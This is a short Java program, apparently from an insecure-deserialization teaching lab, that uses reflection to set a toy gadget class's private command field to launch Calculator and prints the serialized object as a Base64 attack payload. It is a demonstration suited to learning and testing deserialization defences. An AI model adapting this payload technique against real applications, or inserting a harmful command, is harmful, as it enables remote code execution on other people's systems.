package attacker.level1;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

import victim.level1.SomeDangerousSerializableThing;


public class AttackerPayloadCreator {

  public static void main(String[] args) throws Exception {
    System.out.println("Serializing a malicious payload:");
    ByteArrayOutputStream baos = new ByteArrayOutputStream();

    try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {

      // create the Gadget and set the desired payload data in it
      // (if private, use reflection)
      SomeDangerousSerializableThing gadget = new SomeDangerousSerializableThing();

      // ... set the malicious value for the private command field
      Field commandField = SomeDangerousSerializableThing.class.getDeclaredField("command");
      commandField.setAccessible(true);
      commandField.set(gadget, "/Applications/Calculator.app/Contents/MacOS/Calculator"); // or calc.exe on windows or whatever command on linux 
			
      // serialize the gadget
      oos.writeObject(gadget);
    }

    // Print for attacker to use
    String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
    System.out.println(base64);
  }

}
